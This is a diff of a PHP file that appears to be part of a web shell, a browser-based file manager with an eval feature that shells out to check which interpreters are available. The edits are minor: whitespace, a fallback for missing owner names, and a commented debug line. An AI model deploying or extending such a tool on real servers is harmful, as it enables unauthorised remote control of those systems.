@@ -55,7 +55,7 @@ if(!function_exists('get_server_info')){
 		$server_info['time_at_server'] = "Time <span class='strong'>@</span> Server : ".@date("d M Y H:i:s",time());
 		$server_info['uname'] = php_uname();
 		$server_software = (getenv('SERVER_SOFTWARE')!='')? getenv('SERVER_SOFTWARE')." <span class='strong'>|</span> ":'';
-		$server_info['software'] = $server_software."  PHP ".phpversion();		
+		$server_info['software'] = $server_software."  PHP ".phpversion();
 		return $server_info;
 	}
 }
@@ -407,7 +407,7 @@ if(!function_exists('get_fileowner')){
 		if(function_exists("posix_getpwuid")){
 			$name = posix_getpwuid(fileowner($file));
 			$group = posix_getgrgid(filegroup($file));
-			$owner = $name['name'].":".$group['name'];
+			$owner = ($name['name']?:'?').":".($group['name']?:'?');
 		}
 		return $owner;
 	}
@@ -529,8 +529,8 @@ if(!function_exists('view_file')){
 							"hl_html"=> ini_get('highlight.html'),
 							"hl_comment"=> ini_get('highlight.comment')
 							);
-				
-				
+
+
 				$content = highlight_string(read_file($file),true);
 				foreach($hl_arr as $k=>$v){
 					$content = str_replace("<font color=\"".$v."\">", "<font class='".$k."'>", $content);
@@ -712,10 +712,12 @@ if(!function_exists('show_all_files')){
 	<tr data-path=\"".html_safe(realpath($d).DIRECTORY_SEPARATOR)."\"><td><div class='cBox".$cboxException."'></div></td>
 	<td style='white-space:normal;'><a class='navigate'>[ ".html_safe($d)." ]</a><span class='".$action." floatRight'>action</span></td>
 	<td>DIR</td>";
-			foreach($cols as $k=>$v){
+
+            foreach($cols as $k=>$v){
 				$sortable = "";
 				if($k=='modified') $sortable = " title='".filemtime($d)."'";
 				$output .= "<td".$sortable.">".$v($d)."</td>";
+//				$output .= "<td".$sortable.">".(isset($v[$d])?$v[$d]:'---aa')."</td>";
 			}
 			$output .= "</tr>";
 		}
@@ -766,7 +768,7 @@ if(!function_exists('show_all_files')){
 if(!function_exists('eval_get_supported')){
 	function eval_get_supported(){
 		$eval_supported = array();
-		
+
 		$eval_supported[] = "php";
 
 		$check = strtolower(execute("python -h"));
